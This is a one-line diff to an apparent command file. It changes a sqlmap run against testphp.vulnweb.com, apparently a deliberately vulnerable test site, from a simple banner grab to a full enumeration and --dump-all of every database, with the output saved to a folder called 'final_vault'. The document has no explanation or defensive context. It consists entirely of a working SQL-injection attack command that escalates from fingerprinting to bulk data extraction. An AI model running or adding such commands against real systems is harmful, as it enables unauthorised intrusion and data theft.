@@ -1,1 +1,1 @@
-python3 sqlmap/sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --banner && echo "DONE" > results.txt
+python3 sqlmap/sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --dbs --tables --dump-all --output-dir=final_vault
